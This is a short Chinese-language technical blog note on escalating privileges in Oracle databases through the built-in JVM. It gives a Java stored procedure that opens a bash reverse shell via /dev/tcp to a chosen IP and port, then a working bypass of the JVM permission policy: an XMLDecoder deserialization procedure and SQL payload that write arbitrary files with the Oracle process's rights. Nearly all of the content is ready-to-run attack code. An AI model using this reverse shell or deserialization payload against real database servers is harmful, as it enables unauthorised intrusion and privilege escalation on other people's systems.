---
title: "Oracle 提权-XML 反序列化"
author: ["4shen0ne"]
draft: false
---

Oracle 内置的 JVM 有默认的安全控制策略，直接用 `Runtime.exec()` 执行系统命令会报错。

比如：

```java
SET scan off

create or replace and compile java source named ReverseShell as
import java.io.*;
public class ReverseShell{
   public static void getConnection(String ip, String port) throws InterruptedException, IOException{
      Runtime r = Runtime.getRuntime();
      Process p = r.exec(new String[]{"/bin/bash","-c","0<&126-;exec 126<>/dev/tcp/" + ip + "/" + port + ";/bin/bash <&126 >&126 2>&126"});
      System.out.println(p.toString());
      p.waitFor();
   }
}

// then
create or replace procedure reverse_shell (p_ip IN VARCHAR2,p_port IN VARCHAR2)
IS language java name 'ReverseShell.getConnection(java.lang.String, java.lang.String)';
```

会触发以下错误：

{{< figure src="/ox-hugo/2021-07-28_10-31-01_java-reverse-shell-perm-error.png" >}}

但是可以利用 XMLDecoder，它在反序列化过程时可以绕过 JVM 的权限管理策略，向系统写入
任意文件。

```java
create or replace and compile java source named DecodeMe as
import java.io.*;
import java.beans.*;
public class DecodeMe{
    public static void input(String xml) throws InterruptedException, IOException {

      XMLDecoder decoder = new XMLDecoder ( new ByteArrayInputStream(xml.getBytes()));
      Object object = decoder.readObject();
      System.out.println(object.toString());
      decoder.close();

    }
}
;

// then
CREATE OR REPLACE PROCEDURE decodeme (p_xml IN VARCHAR2) IS
    language java name 'DecodeMe.input(java.lang.String)';
```

然后执行以下 SQL 语句：

```sql
BEGIN
   decodeme('
    <java class="java.beans.XMLDecoder" version="1.4.0" >
        <object class="java.io.FileWriter">
          <string>/tmp/PleaseDoNotWork.txt </string>
          <boolean>True</boolean>
          <void method="write">
              <string>Why for the love of god?</string>
          </void>
          <void method="close" />
        </object>
    </java>');
END;
```

将会以 Oracle 运行者的权限写入 PleaseDoNotWork.txt 文件。
